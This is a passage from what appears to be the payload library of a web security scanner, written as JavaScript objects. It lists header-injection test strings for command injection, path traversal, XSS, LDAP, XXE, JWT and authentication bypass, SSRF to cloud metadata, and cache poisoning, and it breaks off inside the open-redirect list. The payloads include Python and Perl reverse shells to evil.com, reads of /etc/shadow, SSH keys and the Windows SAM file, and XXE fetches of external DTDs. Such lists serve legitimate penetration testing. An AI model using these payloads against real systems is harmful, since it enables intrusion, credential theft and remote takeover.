                    { name: "Python Reverse", payload: "X-File: test.txt; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"evil.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", severity: "critical" },
                    { name: "Perl Reverse", payload: "X-File: test.txt; perl -e 'use Socket;$i=\"evil.com\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'", severity: "critical" },
                    { name: "PHP System", payload: "X-File: test.txt; php -r 'system(\"whoami\");'", severity: "critical" },
                    { name: "Ruby Exec", payload: "X-File: test.txt; ruby -e 'exec \"whoami\"'", severity: "critical" },
                    
                    // Environment variables
                    { name: "PATH Override", payload: "X-File: test.txt; PATH=/tmp:$PATH; whoami", severity: "high" },
                    { name: "LD_PRELOAD", payload: "X-File: test.txt; LD_PRELOAD=/tmp/evil.so whoami", severity: "critical" },
                    { name: "IFS Manipulation", payload: "X-File: test.txt;IFS=,;`echo,whoami`", severity: "high" },
                    { name: "Env Command", payload: "X-File: test.txt; env", severity: "medium" },
                    { name: "Export Var", payload: "X-File: test.txt; export EVIL=1; echo $EVIL", severity: "low" },
                    { name: "Unset Var", payload: "X-File: test.txt; unset PATH; whoami", severity: "medium" },
                    
                    // Encoding bypasses
                    { name: "Base64 Decode", payload: "X-File: test.txt; echo d2hvYW1p | base64 -d | sh", severity: "critical" },
                    { name: "Hex Decode", payload: "X-File: test.txt; echo 77686f616d69 | xxd -r -p | sh", severity: "critical" },
                    { name: "URL Decode", payload: "X-File: test.txt%3B%20whoami", severity: "high" },
                    { name: "Double Encoding", payload: "X-File: test.txt%253B%2520whoami", severity: "high" },
                    { name: "Unicode Encode", payload: "X-File: test.txt\\u003B whoami", severity: "medium" },
                    { name: "Octal Encode", payload: "X-File: test.txt\\073 whoami", severity: "medium" },
                    
                    // Time delays
                    { name: "Sleep Command", payload: "X-File: test.txt; sleep 5", severity: "medium" },
                    { name: "Ping Delay", payload: "X-File: test.txt; ping -c 5 127.0.0.1", severity: "medium" },
                    { name: "Timeout Command", payload: "X-File: test.txt & timeout 5", severity: "medium" },
                    
                    // Chained commands
                    { name: "Multi Command", payload: "X-File: test.txt; id; whoami; pwd", severity: "high" },
                    { name: "Command Loop", payload: "X-File: test.txt; for i in 1 2 3; do whoami; done", severity: "high" },
                    { name: "While Loop", payload: "X-File: test.txt; while true; do whoami; break; done", severity: "high" }
                ]
            },
            
            "Path Traversal": {
                icon: "fa-folder-open",
                tests: [
                    // Basic traversal
                    { name: "Basic Unix Traversal", payload: "X-File: ../../../etc/passwd", severity: "high" },
                    { name: "Basic Windows Traversal", payload: "X-File: ..\\..\\..\\windows\\win.ini", severity: "high" },
                    { name: "Deep Unix Traversal", payload: "X-File: ../../../../../../../../../../../../etc/passwd", severity: "high" },
                    { name: "Deep Windows Traversal", payload: "X-File: ..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini", severity: "high" },
                    { name: "Root Path Unix", payload: "X-File: /etc/passwd", severity: "medium" },
                    { name: "Root Path Windows", payload: "X-File: C:\\windows\\win.ini", severity: "medium" },
                    { name: "Home Directory", payload: "X-File: ~/.bashrc", severity: "medium" },
                    { name: "Current Directory", payload: "X-File: ./config.php", severity: "low" },
                    
                    // URL encoded
                    { name: "URL Encoded Dots", payload: "X-File: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", severity: "high" },
                    { name: "URL Encoded Slash", payload: "X-File: ..%2f..%2f..%2fetc%2fpasswd", severity: "high" },
                    { name: "Double URL Encoded", payload: "X-File: %252e%252e%252f%252e%252e%252fetc%252fpasswd", severity: "high" },
                    { name: "Partial URL Encoded", payload: "X-File: ..%2fetc%2fpasswd", severity: "high" },
                    { name: "Mixed Encoding", payload: "X-File: %2e%2e/../etc/passwd", severity: "high" },
                    { name: "Unicode Encoded", payload: "X-File: %c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", severity: "high" },
                    { name: "UTF-8 Encoded", payload: "X-File: %c0%af%c0%af/%c0%af%c0%af/etc/passwd", severity: "high" },
                    
                    // Null byte injection
                    { name: "Null Byte Extension", payload: "X-File: ../../../etc/passwd%00.jpg", severity: "high" },
                    { name: "Null Byte Middle", payload: "X-File: ../../../etc/passwd%00/test.jpg", severity: "high" },
                    { name: "Double Null Byte", payload: "X-File: ../../../etc/passwd%00%00", severity: "high" },
                    { name: "Encoded Null Byte", payload: "X-File: ../../../etc/passwd\\x00.jpg", severity: "high" },
                    
                    // Windows specific
                    { name: "Windows SAM", payload: "X-File: ..\\..\\..\\windows\\system32\\config\\sam", severity: "critical" },
                    { name: "Windows Hosts", payload: "X-File: ..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", severity: "high" },
                    { name: "Windows Boot.ini", payload: "X-File: ..\\..\\..\\boot.ini", severity: "high" },
                    { name: "UNC Path", payload: "X-File: \\\\evil.com\\share\\file.txt", severity: "high" },
                    { name: "Long UNC Path", payload: "X-File: \\\\?\\C:\\windows\\win.ini", severity: "high" },
                    { name: "DOS Device", payload: "X-File: \\\\.\\CON", severity: "medium" },
                    { name: "Alternative Stream", payload: "X-File: file.txt::$DATA", severity: "medium" },
                    
                    // Unix specific
                    { name: "Shadow File", payload: "X-File: ../../../etc/shadow", severity: "critical" },
                    { name: "SSH Keys", payload: "X-File: ../../../root/.ssh/id_rsa", severity: "critical" },
                    { name: "Apache Config", payload: "X-File: ../../../etc/apache2/apache2.conf", severity: "high" },
                    { name: "Nginx Config", payload: "X-File: ../../../etc/nginx/nginx.conf", severity: "high" },
                    { name: "Proc Environ", payload: "X-File: ../../../proc/self/environ", severity: "high" },
                    { name: "Proc Cmdline", payload: "X-File: ../../../proc/self/cmdline", severity: "medium" },
                    { name: "Proc Maps", payload: "X-File: ../../../proc/self/maps", severity: "medium" },
                    
                    // Filter bypasses
                    { name: "Double Dots", payload: "X-File: ....//....//....//etc/passwd", severity: "high" },
                    { name: "Triple Dots", payload: "X-File: ...///...///...///etc/passwd", severity: "high" },
                    { name: "Backslash Unix", payload: "X-File: ..\\..\\..\\etc\\passwd", severity: "high" },
                    { name: "Forward Windows", payload: "X-File: ../../../windows/win.ini", severity: "high" },
                    { name: "Mixed Slashes", payload: "X-File: ..\\/..\\/..\\/etc/passwd", severity: "high" },
                    { name: "Absolute With Traversal", payload: "X-File: /var/www/../../etc/passwd", severity: "high" },
                    { name: "Encoded Dots Only", payload: "X-File: %2e%2e%2e%2e%2e%2e/etc/passwd", severity: "high" },
                    
                    // Special cases
                    { name: "PHP Filter", payload: "X-File: php://filter/convert.base64-encode/resource=../../../etc/passwd", severity: "high" },
                    { name: "PHP Input", payload: "X-File: php://input", severity: "high" },
                    { name: "Data URI", payload: "X-File: data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==", severity: "medium" },
                    { name: "Expect Wrapper", payload: "X-File: expect://whoami", severity: "critical" },
                    { name: "File Protocol", payload: "X-File: file:///etc/passwd", severity: "high" },
                    { name: "Dict Protocol", payload: "X-File: dict://localhost:11211/stat", severity: "medium" },
                    { name: "Gopher Protocol", payload: "X-File: gopher://localhost:70/", severity: "medium" }
                ]
            },
            
            "XSS Headers": {
                icon: "fa-bug",
                tests: [
                    // Basic XSS
                    { name: "Script Tag XSS", payload: "X-User: <script>alert(1)< /script>", severity: "high" },
                    { name: "IMG Tag XSS", payload: "X-User: <img src=x onerror=alert(1)>", severity: "high" },
                    { name: "SVG XSS", payload: "X-User: <svg onload=alert(1)>", severity: "high" },
                    { name: "Body Onload", payload: "X-User: <body onload=alert(1)>", severity: "high" },
                    { name: "Iframe XSS", payload: "X-User: <iframe src=javascript:alert(1)>", severity: "high" },
                    { name: "Object XSS", payload: "X-User: <object data=javascript:alert(1)>", severity: "high" },
                    { name: "Embed XSS", payload: "X-User: <embed src=javascript:alert(1)>", severity: "high" },
                    { name: "Video XSS", payload: "X-User: <video src=x onerror=alert(1)>", severity: "high" },
                    { name: "Audio XSS", payload: "X-User: <audio src=x onerror=alert(1)>", severity: "high" },
                    { name: "Input Autofocus", payload: "X-User: <input autofocus onfocus=alert(1)>", severity: "high" },
                    
                    // Event handlers
                    { name: "Onclick XSS", payload: "X-User: <div onclick=alert(1)>click</div>", severity: "high" },
                    { name: "Onmouseover XSS", payload: "X-User: <div onmouseover=alert(1)>hover</div>", severity: "high" },
                    { name: "Onmouseenter XSS", payload: "X-User: <div onmouseenter=alert(1)>enter</div>", severity: "high" },
                    { name: "Onkeypress XSS", payload: "X-User: <input onkeypress=alert(1)>", severity: "high" },
                    { name: "Onchange XSS", payload: "X-User: <select onchange=alert(1)><option>1</option></select>", severity: "high" },
                    { name: "Onsubmit XSS", payload: "X-User: <form onsubmit=alert(1)><input type=submit></form>", severity: "high" },
                    { name: "Ondblclick XSS", payload: "X-User: <div ondblclick=alert(1)>double click</div>", severity: "high" },
                    { name: "Oncontextmenu XSS", payload: "X-User: <div oncontextmenu=alert(1)>right click</div>", severity: "high" },
                    
                    // JavaScript URLs
                    { name: "Javascript Protocol", payload: "X-Referer: javascript:alert(1)", severity: "high" },
                    { name: "Data URI XSS", payload: "X-Referer: data:text/html,<script>alert(1)< /script>", severity: "high" },
                    { name: "VBScript Protocol", payload: "X-Referer: vbscript:alert(1)", severity: "medium" },
                    { name: "Livescript Protocol", payload: "X-Referer: livescript:alert(1)", severity: "low" },
                    
                    // Encoded XSS
                    { name: "HTML Entity Encode", payload: "X-User: &lt;script&gt;alert(1)&lt;/script&gt;", severity: "medium" },
                    { name: "URL Encode XSS", payload: "X-User: %3Cscript%3Ealert(1)%3C/script%3E", severity: "medium" },
                    { name: "Unicode XSS", payload: "X-User: \\u003cscript\\u003ealert(1)\\u003c/script\\u003e", severity: "medium" },
                    { name: "Hex Entity XSS", payload: "X-User: &#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;", severity: "medium" },
                    { name: "Decimal Entity XSS", payload: "X-User: &#60;script&#62;alert(1)&#60;/script&#62;", severity: "medium" },
                    { name: "Base64 XSS", payload: "X-User: PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", severity: "low" },
                    
                    // Filter bypasses
                    { name: "Case Variation", payload: "X-User: <ScRiPt>alert(1)</ sCrIpT>", severity: "medium" },
                    { name: "Null Byte XSS", payload: "X-User: <scr\\x00ipt>alert(1)< /scr\\x00ipt>", severity: "high" },
                    { name: "Newline XSS", payload: "X-User: <scr\\nipt>alert(1)</ scr\\nipt>", severity: "medium" },
                    { name: "Tab XSS", payload: "X-User: <scr\\tipt>alert(1)</ scr\\tipt>", severity: "medium" },
                    { name: "CR XSS", payload: "X-User: <scr\\ript>alert(1)< /scr\\ript>", severity: "medium" },
                    { name: "Space Variants", payload: "X-User: <script\\x20>alert(1)< /script>", severity: "medium" },
                    { name: "Comment XSS", payload: "X-User: <script>/*comment*/alert(1)< /script>", severity: "medium" },
                    { name: "Backtick XSS", payload: "X-User: <script>alert`1`< /script>", severity: "medium" },
                    
                    // DOM XSS
                    { name: "Location Hash", payload: "X-Return-URL: #<img src=x onerror=alert(1)>", severity: "high" },
                    { name: "Document Write", payload: "X-User: <script>document.write('<img src=x onerror=alert(1)>')< /script>", severity: "high" },
                    { name: "InnerHTML", payload: "X-User: <script>document.body.innerHTML='<img src=x onerror=alert(1)>'</ script>", severity: "high" },
                    
                    // Polyglot XSS
                    { name: "Polyglot Basic", payload: "X-User: javascript:/*--></title></style></textarea>< /script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>", severity: "critical" },
                    { name: "Polyglot Advanced", payload: "X-User: jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/< /scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>", severity: "critical" },
                    
                    // mXSS (mutation XSS)
                    { name: "mXSS Style", payload: "X-User: <style><img src=x onerror=alert(1)></style>", severity: "high" },
                    { name: "mXSS Noscript", payload: "X-User: <noscript><img src=x onerror=alert(1)></noscript>", severity: "medium" },
                    { name: "mXSS Template", payload: "X-User: <template><img src=x onerror=alert(1)></template>", severity: "medium" }
                ]
            },
            
            "LDAP Injection": {
                icon: "fa-address-book",
                tests: [
                    // Basic LDAP
                    { name: "LDAP True Condition", payload: "X-User: admin)(uid=*))(|(uid=*", severity: "high" },
                    { name: "LDAP OR Injection", payload: "X-User: admin)(|(uid=*", severity: "high" },
                    { name: "LDAP AND Injection", payload: "X-User: admin)(&(uid=*", severity: "high" },
                    { name: "LDAP NOT Injection", payload: "X-User: admin)(!(uid=*", severity: "high" },
                    { name: "LDAP Wildcard", payload: "X-User: *", severity: "medium" },
                    { name: "LDAP Null Search", payload: "X-User: admin)(uid=*)(!(uid=null", severity: "high" },
                    { name: "LDAP Null Bind", payload: "X-User: \\x00", severity: "high" },
                    { name: "LDAP Filter Bypass", payload: "X-User: *)(uid=*))(|(uid=*", severity: "high" },
                    { name: "LDAP Comment", payload: "X-User: admin)#", severity: "medium" },
                    { name: "LDAP Attributes", payload: "X-User: admin)(mail=*", severity: "medium" },
                    { name: "LDAP Boolean", payload: "X-User: admin)(accountStatus=active)(uid=*", severity: "high" },
                    { name: "LDAP Escape", payload: "X-User: admin\\29", severity: "medium" },
                    { name: "LDAP Unicode", payload: "X-User: admin)(uid=*\\00", severity: "high" },
                    { name: "LDAP Hex", payload: "X-User: admin)(uid=\\2a", severity: "medium" }
                ]
            },
            
            "XML/XXE Injection": {
                icon: "fa-code",
                tests: [
                    // XXE attacks
                    { name: "XXE File Read", payload: 'Content-Type: application/xml\\r\\n\\r\\n<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>', severity: "critical" },
                    { name: "XXE HTTP Request", payload: 'Content-Type: application/xml\\r\\n\\r\\n<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://evil.com/xxe">]><root>&test;</root>', severity: "critical" },
                    { name: "XXE PHP Filter", payload: 'Content-Type: application/xml\\r\\n\\r\\n<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&test;</root>', severity: "critical" },
                    { name: "XXE Data Protocol", payload: 'Content-Type: application/xml\\r\\n\\r\\n<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "data://text/plain;base64,SGVsbG8gV29ybGQ=">]><root>&test;</root>', severity: "high" },
                    { name: "XXE Expect", payload: 'Content-Type: application/xml\\r\\n\\r\\n<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "expect://whoami">]><root>&test;</root>', severity: "critical" },
                    { name: "XXE Parameter Entity", payload: 'Content-Type: application/xml\\r\\n\\r\\n<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]><root>&test;</root>', severity: "critical" },
                    { name: "XXE Recursive Entity", payload: 'Content-Type: application/xml\\r\\n\\r\\n<?xml version="1.0"?><!DOCTYPE root [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">]><root>&lol2;</root>', severity: "medium" },
                    { name: "XXE UTF-16", payload: 'Content-Type: application/xml; charset=utf-16\\r\\n\\r\\n<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>', severity: "high" },
                    { name: "XXE SOAP", payload: 'SOAPAction: "test"\\r\\nContent-Type: text/xml\\r\\n\\r\\n<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body>&test;</soap:Body></soap:Envelope>', severity: "critical" },
                    { name: "XXE SVG", payload: 'Content-Type: image/svg+xml\\r\\n\\r\\n<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY test SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg">&test;</svg>', severity: "high" },
                    { name: "XXE XHTML", payload: 'Content-Type: application/xhtml+xml\\r\\n\\r\\n<?xml version="1.0"?><!DOCTYPE html [<!ENTITY test SYSTEM "file:///etc/passwd">]><html xmlns="http://www.w3.org/1999/xhtml"><body>&test;</body></html>', severity: "high" },
                    { name: "XXE RSS", payload: 'Content-Type: application/rss+xml\\r\\n\\r\\n<?xml version="1.0"?><!DOCTYPE rss [<!ENTITY test SYSTEM "file:///etc/passwd">]><rss version="2.0"><channel>&test;</channel></rss>', severity: "high" },
                    { name: "XXE Atom", payload: 'Content-Type: application/atom+xml\\r\\n\\r\\n<?xml version="1.0"?><!DOCTYPE feed [<!ENTITY test SYSTEM "file:///etc/passwd">]><feed xmlns="http://www.w3.org/2005/Atom">&test;</feed>', severity: "high" },
                    { name: "XXE DTD URL", payload: 'X-DTD-URL: http://evil.com/evil.dtd', severity: "high" },
                    { name: "XXE XInclude", payload: 'Content-Type: application/xml\\r\\n\\r\\n<?xml version="1.0"?><root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd"/></root>', severity: "high" }
                ]
            },
            
            "Authentication Bypass": {
                icon: "fa-user-secret",
                tests: [
                    // JWT attacks
                    { name: "JWT None Algorithm", payload: "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.", severity: "critical" },
                    { name: "JWT Weak Secret", payload: "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.qmFBgfHMvVVUC6bvvVhqBhGLfHJTmVKqGFqPOFKEV_k", severity: "high" },
                    { name: "JWT Algorithm Confusion", payload: "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.jiMyrsmD8AoHWeQgmxZ5yq8m3BMuy7HdzIeb05llDHg", severity: "critical" },
                    { name: "JWT Kid Injection", payload: 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uL2V0Yy9wYXNzd2QifQ.eyJzdWIiOiJhZG1pbiJ9.7qrWfEHEvVz_kPe5YfZPJaLaUm2JY5AlLF6M_Nl3wz0', severity: "high" },
                    { name: "JWT Null Signature", payload: "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.", severity: "high" },
                    { name: "JWT Expired Token", payload: "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MX0.YJzaBV76eB8YrNE8OKvSqMMOwasoAIfGD-SyvBLG0Is", severity: "medium" },
                    { name: "JWT JKU Injection", payload: 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHA6Ly9ldmlsLmNvbS9qd2tzLmpzb24ifQ.eyJzdWIiOiJhZG1pbiJ9', severity: "critical" },
                    { name: "JWT X5U Injection", payload: 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dSI6Imh0dHA6Ly9ldmlsLmNvbS9jZXJ0In0.eyJzdWIiOiJhZG1pbiJ9', severity: "critical" },
                    
                    // Basic Auth attacks
                    { name: "Basic Auth Null", payload: "Authorization: Basic \\x00", severity: "high" },
                    { name: "Basic Auth Empty", payload: "Authorization: Basic", severity: "medium" },
                    { name: "Basic Auth Invalid", payload: "Authorization: Basic !!!!", severity: "low" },
                    { name: "Basic Auth Admin", payload: "Authorization: Basic YWRtaW46YWRtaW4=", severity: "high" },
                    { name: "Basic Auth Overflow", payload: "Authorization: Basic " + "A".repeat(1000), severity: "medium" },
                    { name: "Basic Auth Unicode", payload: "Authorization: Basic YWRtaW46cGFzc3dvcmQ=\\u0000", severity: "medium" },
                    { name: "Basic Auth CRLF", payload: "Authorization: Basic YWRtaW46cGFzc3dvcmQ=\\r\\nX-Admin: true", severity: "high" },
                    
                    // Bearer Token attacks
                    { name: "Bearer Empty", payload: "Authorization: Bearer", severity: "low" },
                    { name: "Bearer Null", payload: "Authorization: Bearer \\x00", severity: "medium" },
                    { name: "Bearer Multiple", payload: "Authorization: Bearer token1\\r\\nAuthorization: Bearer token2", severity: "high" },
                    { name: "Bearer Overflow", payload: "Authorization: Bearer " + "A".repeat(1000), severity: "medium" },
                    { name: "Bearer SQL", payload: "Authorization: Bearer ' OR '1'='1", severity: "high" },
                    { name: "Bearer Command", payload: "Authorization: Bearer $(whoami)", severity: "high" },
                    
                    // API Key attacks
                    { name: "API Key Empty", payload: "X-API-Key: ", severity: "low" },
                    { name: "API Key Null", payload: "X-API-Key: \\x00", severity: "medium" },
                    { name: "API Key Multiple", payload: "X-API-Key: user\\r\\nX-API-Key: admin", severity: "high" },
                    { name: "API Key Default", payload: "X-API-Key: 12345", severity: "high" },
                    { name: "API Key Test", payload: "X-API-Key: test", severity: "high" },
                    { name: "API Key Debug", payload: "X-API-Key: debug", severity: "high" },
                    
                    // Session attacks
                    { name: "Session Fixation", payload: "Cookie: PHPSESSID=admin123", severity: "high" },
                    { name: "Session Prediction", payload: "Cookie: session=1", severity: "high" },
                    { name: "Session Overflow", payload: "Cookie: session=" + "A".repeat(1000), severity: "medium" },
                    { name: "Session Null", payload: "Cookie: session=\\x00", severity: "medium" },
                    { name: "Session Multiple", payload: "Cookie: session=user\\r\\nCookie: session=admin", severity: "high" },
                    { name: "Session Tampering", payload: "Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ==", severity: "high" },
                    
                    // OAuth attacks
                    { name: "OAuth State Missing", payload: "X-OAuth-State: ", severity: "high" },
                    { name: "OAuth State Fixed", payload: "X-OAuth-State: 12345", severity: "high" },
                    { name: "OAuth Redirect", payload: "X-OAuth-Redirect: http://evil.com", severity: "high" },
                    { name: "OAuth Scope", payload: "X-OAuth-Scope: admin", severity: "high" },
                    { name: "OAuth Token Type", payload: "Authorization: Basic <oauth_token>", severity: "medium" }
                ]
            },
            
            "SSRF Headers": {
                icon: "fa-network-wired",
                tests: [
                    // Standard SSRF
                    { name: "Referer AWS Meta", payload: "Referer: http://169.254.169.254/latest/meta-data/", severity: "critical" },
                    { name: "Referer AWS Creds", payload: "Referer: http://169.254.169.254/latest/meta-data/iam/security-credentials/", severity: "critical" },
                    { name: "Referer AWS User", payload: "Referer: http://169.254.169.254/latest/user-data/", severity: "critical" },
                    { name: "Referer GCP Meta", payload: "Referer: http://metadata.google.internal/computeMetadata/v1/", severity: "critical" },
                    { name: "Referer Azure Meta", payload: "Referer: http://169.254.169.254/metadata/instance?api-version=2019-06-01", severity: "critical" },
                    { name: "Referer Localhost", payload: "Referer: http://localhost:8080/admin", severity: "high" },
                    { name: "Referer Internal", payload: "Referer: http://10.0.0.1/", severity: "high" },
                    { name: "Referer Private", payload: "Referer: http://192.168.1.1/", severity: "high" },
                    { name: "Referer IPv6 Local", payload: "Referer: http://[::1]:8080/", severity: "high" },
                    { name: "Referer File", payload: "Referer: file:///etc/passwd", severity: "critical" },
                    { name: "Referer Gopher", payload: "Referer: gopher://localhost:70/", severity: "high" },
                    { name: "Referer Dict", payload: "Referer: dict://localhost:11211/info", severity: "high" },
                    { name: "Referer SFTP", payload: "Referer: sftp://localhost:22/", severity: "high" },
                    { name: "Referer TFTP", payload: "Referer: tftp://localhost:69/test", severity: "medium" },
                    { name: "Referer LDAP", payload: "Referer: ldap://localhost:389/", severity: "high" },
                    
                    // Origin SSRF
                    { name: "Origin AWS", payload: "Origin: http://169.254.169.254", severity: "critical" },
                    { name: "Origin Localhost", payload: "Origin: http://localhost", severity: "high" },
                    { name: "Origin Internal", payload: "Origin: http://internal.company.com", severity: "high" },
                    { name: "Origin File", payload: "Origin: file://", severity: "high" },
                    
                    // X-Forwarded headers
                    { name: "X-Forwarded-For AWS", payload: "X-Forwarded-For: 169.254.169.254", severity: "high" },
                    { name: "X-Forwarded-Host AWS", payload: "X-Forwarded-Host: 169.254.169.254", severity: "high" },
                    { name: "X-Forwarded-Proto File", payload: "X-Forwarded-Proto: file", severity: "medium" },
                    { name: "X-Forwarded-Port Admin", payload: "X-Forwarded-Port: 8080", severity: "low" },
                    { name: "X-Forwarded-Server", payload: "X-Forwarded-Server: internal.local", severity: "medium" },
                    
                    // URL override headers
                    { name: "X-Original-URL SSRF", payload: "X-Original-URL: http://169.254.169.254/", severity: "critical" },
                    { name: "X-Rewrite-URL SSRF", payload: "X-Rewrite-URL: http://localhost/admin", severity: "high" },
                    { name: "X-Real-IP AWS", payload: "X-Real-IP: 169.254.169.254", severity: "high" },
                    { name: "X-Remote-IP Internal", payload: "X-Remote-IP: 10.0.0.1", severity: "medium" },
                    { name: "X-Client-IP Private", payload: "X-Client-IP: 192.168.1.1", severity: "medium" },
                    { name: "X-Host Internal", payload: "X-Host: internal.company.com", severity: "high" },
                    { name: "X-Forwarded-Scheme", payload: "X-Forwarded-Scheme: gopher", severity: "medium" },
                    
                    // Webhook/Callback
                    { name: "X-Webhook-URL AWS", payload: "X-Webhook-URL: http://169.254.169.254/", severity: "critical" },
                    { name: "X-Callback-URL Local", payload: "X-Callback-URL: http://localhost:8080/", severity: "high" },
                    { name: "X-Return-URL File", payload: "X-Return-URL: file:///etc/passwd", severity: "critical" },
                    { name: "X-Success-URL SSRF", payload: "X-Success-URL: http://internal.local/", severity: "high" },
                    { name: "X-Failure-URL SSRF", payload: "X-Failure-URL: gopher://localhost:70/", severity: "high" },
                    
                    // DNS Rebinding
                    { name: "Host DNS Rebind", payload: "Host: 169.254.169.254.xip.io", severity: "high" },
                    { name: "Host Subdomain", payload: "Host: aws.169.254.169.254.nip.io", severity: "high" },
                    { name: "Host Encoded", payload: "Host: 169%2e254%2e169%2e254", severity: "medium" },
                    { name: "Host Decimal", payload: "Host: 2852039166", severity: "medium" },
                    { name: "Host Octal", payload: "Host: 0251.0376.0251.0376", severity: "medium" },
                    { name: "Host Hex", payload: "Host: 0xa9.0xfe.0xa9.0xfe", severity: "medium" }
                ]
            },
            
            "Cache Poisoning": {
                icon: "fa-sync",
                tests: [
                    // Unkeyed headers
                    { name: "X-Forwarded-Host Poison", payload: "X-Forwarded-Host: evil.com\\r\\nCache-Control: max-age=3600", severity: "high" },
                    { name: "X-Host Poison", payload: "X-Host: evil.com\\r\\nCache-Control: public", severity: "high" },
                    { name: "X-Forwarded-Server", payload: "X-Forwarded-Server: evil.com", severity: "medium" },
                    { name: "X-HTTP-Host-Override", payload: "X-HTTP-Host-Override: evil.com", severity: "high" },
                    { name: "X-Original-Host", payload: "X-Original-Host: evil.com", severity: "high" },
                    { name: "X-Rewrite-URL Cache", payload: "X-Rewrite-URL: /admin\\r\\nCache-Control: public", severity: "high" },
                    { name: "X-Original-URL Cache", payload: "X-Original-URL: /admin\\r\\nCache-Control: public", severity: "high" },
                    
                    // Cache key manipulation
                    { name: "Vary Injection", payload: "X-Test: poison\\r\\nVary: X-Test", severity: "medium" },
                    { name: "Cache-Control Public", payload: "X-Poison: true\\r\\nCache-Control: public, s-maxage=3600", severity: "medium" },
                    { name: "Pragma No-Cache", payload: "Pragma: no-cache\\r\\nX-Poison: true", severity: "low" },
                    { name: "Age Header", payload: "Age: 0\\r\\nX-Cache-Poison: true", severity: "low" },
                    { name: "ETag Injection", payload: 'ETag: "poisoned"\\r\\nX-Poison: true', severity: "low" },
                    { name: "Last-Modified", payload: "Last-Modified: Thu, 01 Jan 1970 00:00:00 GMT", severity: "low" },
                    
                    // Method override cache
                    { name: "Method Override Cache", payload: "X-HTTP-Method-Override: POST\\r\\nCache-Control: public", severity: "high" },
                    { name: "X-Method-Override Cache", payload: "X-Method-Override: DELETE\\r\\nCache-Control: max-age=3600", severity: "high" },
                    { name: "X-HTTP-Method Cache", payload: "X-HTTP-Method: PUT\\r\\nCache-Control: public", severity: "high" },
                    
                    // Response splitting cache
                    { name: "Cache CRLF Injection", payload: "X-Test: value\\r\\nCache-Control: public\\r\\nX-Poison: true", severity: "high" },
                    { name: "Cache Set-Cookie", payload: "X-Test: value\\r\\nSet-Cookie: admin=true\\r\\nCache-Control: public", severity: "critical" },
                    { name: "Cache Location", payload: "X-Test: value\\r\\nLocation: http://evil.com\\r\\nCache-Control: public", severity: "critical" },
                    
                    // Port poisoning
                    { name: "X-Forwarded-Port", payload: "X-Forwarded-Port: 443\\r\\nCache-Control: public", severity: "medium" },
                    { name: "X-Port-Override", payload: "X-Port-Override: 8443", severity: "low" },
                    
                    // Protocol poisoning
                    { name: "X-Forwarded-Proto HTTP", payload: "X-Forwarded-Proto: http\\r\\nCache-Control: public", severity: "medium" },
                    { name: "X-Forwarded-SSL Off", payload: "X-Forwarded-SSL: off\\r\\nCache-Control: public", severity: "medium" },
                    { name: "X-URL-Scheme HTTP", payload: "X-URL-Scheme: http", severity: "low" }
                ]
            },
            
            "Open Redirect": {
                icon: "fa-external-link-alt",
                tests: [
                    // Referer redirects
                    { name: "Referer Redirect", payload: "Referer: http://evil.com", severity: "medium" },
                    { name: "Referer JavaScript", payload: "Referer: javascript:alert(1)", severity: "high" },
                    { name: "Referer Data URI", payload: "Referer: data:text/html,<script>alert(1)< /script>", severity: "high" },
                    
                    // Return URL headers
